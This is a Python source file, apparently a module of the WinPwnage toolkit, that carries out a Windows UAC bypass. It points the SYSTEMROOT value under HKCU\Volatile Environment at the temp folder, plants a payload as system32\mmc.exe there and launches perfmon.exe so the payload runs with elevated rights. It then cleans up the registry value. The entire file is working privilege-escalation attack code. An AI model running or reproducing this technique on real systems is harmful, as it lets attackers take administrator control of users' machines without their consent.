import os
import time
import shutil
import _winreg
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *

perfmon_info = {
	"Description": "Bypass UAC using perfmon and registry key manipulation",
	"Id": "7",
	"Type": "UAC bypass",
	#"Fixed In": "16299",
	"Fixed In": "16299" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "perfmon",
	"Function Payload": True,
}


def perfmon(payload):
	if payloads().exe(payload):
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Volatile Environment"))
			_winreg.SetValueEx(key, "SYSTEMROOT", 0, _winreg.REG_SZ,tempfile.gettempdir())
			_winreg.CloseKey(key)
		except Exception as error:
			print_error("Unable to create registry keys, exception was raised: {}".format(error))
			return False
		else:
			print_success("Successfully created SYSTEMROOT key containing a new temp directory ({})".format(
				os.path.join(tempfile.gettempdir())))

		try:
			if os.path.exists(os.path.join(tempfile.gettempdir(), "system32")):
				if os.path.isfile(os.path.join(tempfile.gettempdir(), "system32\\mmc.exe")):
					try:
						os.remove(os.path.join(tempfile.gettempdir(), "system32\\mmc.exe"))
					except Exception as error:
						return False
					try:
						os.rmdir(os.path.join(tempfile.gettempdir(), "system32"))
					except Exception as error:
						return False
				else:
					try:
						os.rmdir(os.path.join(tempfile.gettempdir(), "system32"))
					except Exception as error:
						return False
			else:
				pass
		except Exception as error:
			return False

		try:
			os.makedirs(os.path.join(tempfile.gettempdir(), "system32"))
		except Exception as error:
			return False

		time.sleep(5)

		try:
			if not os.path.exists(payload):
				print_error('Args are not allowed with this technique.')
				return False

			shutil.copy(payload, os.path.join(tempfile.gettempdir(), "system32\\mmc.exe"))
		except shutil.Error as error:
			return False
		except IOError as error:
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("perfmon.exe"):
				print_success("Successfully spawned process ({})".format(payload))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
		
		time.sleep(5)
		
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, os.path.join("Volatile Environment"))
			_winreg.DeleteValue(key, "SYSTEMROOT")
		except Exception as error:
			print_error("Unable to cleanup")
			return False
		else:
			print_success("Successfully cleaned up, enjoy!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
